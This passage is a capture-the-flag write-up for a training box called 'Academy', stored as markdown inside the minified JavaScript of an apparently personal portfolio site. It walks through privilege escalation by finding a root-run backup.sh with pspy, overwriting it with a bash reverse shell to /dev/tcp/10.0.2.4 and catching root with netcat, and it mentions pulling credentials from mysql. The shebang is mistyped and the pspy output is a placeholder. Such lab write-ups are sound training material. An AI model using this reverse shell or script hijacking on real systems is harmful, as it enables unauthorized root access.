\`crontab\` is a Linux tool which allows you to interface w/ [cron](https://github.com/TrshPuppy/obsidian-notes/blob/main/computers/linux/linux-processes.md). Cron is a service which automates linux processes/ commands on an interval. If this \`backup.sh\` script is being ran on an interval, we might find a 'cronjob' for it.

Run \`crontab -l\` to see all the cron jobs associated w/ the current user (grimmie). Unfortunately, there are none.

#### Systemd

Next we can check if there are any 'timers' w/ [systemd](https://github.com/TrshPuppy/obsidian-notes/blob/main/computers/linux/linux-processes.md). Systemd is the service manager for linux and can be used to start and stop processes, etc.. To interact w/ systemd we use the \`systemctl\` command.

To list all of the systemctl timers, we use the command \`systemctl list-timers\`.

\`\`\`bash
grimmie@academy:~$ systemctl list-timers
NEXT                         LEFT         LAST                         PASSED       UNIT
Sat 2023-10-07 14:39:00 EDT  1min 1s left Sat 2023-10-07 14:09:01 EDT  28min ago    phpsessionclean
Sun 2023-10-08 00:00:00 EDT  9h left      Sat 2023-10-07 00:00:01 EDT  14h ago      logrotate.timer
Sun 2023-10-08 00:00:00 EDT  9h left      Sat 2023-10-07 00:00:01 EDT  14h ago      man-db.timer
Sun 2023-10-08 04:45:10 EDT  14h left     Sat 2023-10-07 08:00:01 EDT  6h ago       apt-daily.timer
Sun 2023-10-08 06:06:18 EDT  15h left     Sat 2023-10-07 06:58:01 EDT  7h ago       apt-daily-upgra
Sun 2023-10-08 11:56:02 EDT  21h left     Sat 2023-10-07 09:10:01 EDT  5h 27min ago systemd-tmpfile

6 timers listed.
\`\`\`

There are some timers, but none seem to be related to our backup file.

#### psypy

[psypy](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/actions-on-objective/psypy.md) is a tool developed by DominicBreuker on GitHub. It allows us to monitor linux processes _without root permissions_ w/ live updates. Other linux tools like \`top\`, \`lsof\`, and \`ps aux\` can also be used.

##### Usage

To use psypy as Grimmie we need to get it on the target machine. To do this, first we need to download and install it from the [psypy repo](https://github.com/DominicBreuker/pspy) on our own machine, then serve it using [HTTP](https://github.com/TrshPuppy/obsidian-notes/blob/main/networking/protocols/HTTP.md).

Once it's served, we can \`cd\` into \`/tmp\` where \`backup.zip\` is and use \`wget\` to download it on the target machine. Now, change the permissions of \`pspy64\` so we can execute it using \`chmod +x pspy64\`. Now we can run it:

\`\`\`bash
./psypy64
#####
## PLACEHOLDER
##
##
##
\`\`\`

Scanning the output, we can see that \`backup.sh\` is being ran every minute.

### 2nd RevShell

Now that we've verified that \`backup.sh\` is being executed, we can manipulate that to get another shell, but this time _with root permissions and access_.

#### Our bash script:

A simple script to achieve a shell using [bash](https://github.com/TrshPuppy/obsidian-notes/blob/main/coding/languages/bash.md) is the following:

\`\`\`bash
!#/bin/bash

bash -i >& /dev/tcp/10.0.2.4/44445 0>&1
\`\`\`

Use \`nano\` to edit \`backup.sh\`, get rid of the original code and replace it with this shell code. _Before saving the file_ make sure you have another instance of [netcat](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/netcat.md) up and listening to the correct port.

Once you save the file, it should get executed w/i the next 2 minutes, and on your listener you should see:

\`\`\`bash
nc -lvnp 44445
listening on [any] 44445 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.15] 34634
bash: cannot set terminal process group (18009): Inappropriate ioctl for device
bash: no job control in this shell
root@academy:~#          # <-----------
\`\`\`

## Flag

Once we're in as root, all we have to do is observe our surroundings:

\`\`\`bash
root@academy:~# ls
ls
flag.txt
root@academy:~# cat flag.txt
cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.
Happy hacking !
root@academy:~#
\`\`\`

## Notes on other avenues:

Having tried this box _without watching the walkthrough first_, there are some other interesting avenues one could try. The walkthrough above is a combo of my own investigations + the walkthrough supplied by TCM.

### mysql

Once you've SSH'd into the target as Grimmie, you can access the [mysql](https://github.com/TrshPuppy/obsidian-notes/blob/main/CLI-tools/linux/mysql.md) database using the same password.

![](./md-images/academy-6.png)

Some tasty tables in here include: \`db\` and \`user\`, both of which give you access to credentials.

> Resources:
>
> - [hash-identifier repo](https://www.kali.org/tools/hash-identifier/)
> - [PentestMonkey: PHP Revshell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

> My previous notes (linked in text):
>
> - You'll find them all [here](https://github.com/TrshPuppy/obsidian-notes)
`;function _d(){const t=new ld.Converter,a=hd;return t.makeHtml(a)}function pd(){const t={__html:_d()};return P(Z,{children:P("div",{id:"markdown-div",dangerouslySetInnerHTML:t})})}function md(){return P(Z,{children:P(gd,{})})}function gd(){const[t,a]=qe("portfolio"),s=document.querySelector(".content-container");Ze(()=>{s.addEventListener("click",r)},[]);function r(p){switch(p.target.id){case"writeups-dir":a("writeups");break;case"coding-dir":a("coding");break;case"portfolio-dir":a("portfolio");break;case"portfolio-path-dir":a("portfolio");break;default:return}}return P(Z,{children:[P("div",{id:"port-nav-container",className:"content-stack-top",style:"display:flex",children:[P("p",{children:"/home/trshpuppy/"}),P("p",{id:t==="portfolio"?"":"portfolio-path-dir",className:t==="portfolio"?"":"portfolio-nav-btn",children:"portfolio/"}),P("a",{style:"margin:16px; margin-left:0;",children:t!="portfolio"?t:""}),P("button",{id:t==="portfolio"?"writeups-dir":"portfolio-path-dir",className:"portfolio-nav-btn",children:t=="portfolio"?"Writeups":"Back"}),P("button",{id:"coding-dir",className:t==="portfolio"?"portfolio-nav-btn":"hidden",children:t=="portfolio"?"Coding":""})]}),P(bd,{currentDir:t})]})}function bd(t){return t.currentDir=="portfolio"?P("div",{id:"port-content-container",className:"content-stack-2",children:P(wd,{})}):t.currentDir=="writeups"?P("div",{id:"writeups-content-container",className:"content-stack-2",children:P(pd,{})}):P("div",{id:"conding-content-container",className:"content-stack-2",children:P("p",{children:"Coding"})})}function wd(t){return P(Z,{children:P("div",{className:"section-column",children:[P("h1",{children:"Welcome to my Portfolio!"}),P("div",{id:"portfolio-stack-2-context",className:"section-row",children:[P("img",{id:"portfolio-pant-gif",src:"./TP-pant.gif",alt:"TP Panting GIF"}),P("div",{className:"section-column",children:[P("h2",{children:"Here you'll find various writeups and projects I've been working on, all related to cybersecurity and coding!"}),P("p",{children:" If you'd like to see cybersecurity writeups & content, cd into `Writeups.' Else, cd into 'Coding.'"})]})]})]})})}function yd(){return P("div",{children:"Contact"})}function vd(){return P(Z,{children:[P("div",{id:"nav-container",className:"nav-container",children:P(id,{})}),P("div",{className:"content-container",children:P(kd,{})})]})}function kd(){const[t,a]=qe("Home"),s=He(null),r=He(null);Ze(()=>(r.current=document.querySelector(".linkbox-container"),s.current=document.getElementById("nav-container"),s.current&&s.current.addEventListener("click",p),r.current&&r.current.addEventListener("click",h),()=>{s.current&&s.current.removeEventListener("click",p),r.current&&r.current.removeEventListener("click",h)}),[t]);function p(T){switch(T.target.id){case"portfolio-btn":a("Portfolio");break;case"about-btn":a("About");break;case"contact-btn":a("Contact");break;default:a("Home")}}function h(T){switch(T.target.id){case"paper-gif":a("Portfolio");break;case"tp-wag-gif":a("About");break;case"star-gif":a("Contact");break;default:a("Home")}}let k;switch(t){case"Portfolio":k=md;break;case"About":k=sd;break;case"Contact":k=yd;break;default:k=od}return P(k,{})}ud(P(vd,{}),document.getElementById("app"));
